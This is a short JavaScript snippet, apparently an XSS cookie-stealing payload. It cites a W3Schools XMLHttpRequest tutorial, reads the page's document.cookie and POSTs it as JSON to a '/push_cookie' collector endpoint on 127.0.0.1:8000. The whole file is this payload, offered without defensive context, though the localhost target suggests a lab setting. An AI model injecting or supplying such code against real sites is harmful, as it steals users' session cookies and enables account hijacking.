// Sending data using POST method
// https://www.w3schools.com/xml/ajax_xmlhttprequest_send.asp

// Get cookie data
var x = document.cookie;
// Convert data to JSON
var data = JSON.stringify({'cookie': x});

// Send data
var xhttp = new XMLHttpRequest();
xhttp.open("POST", "http://127.0.0.1:8000/push_cookie", true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send(data);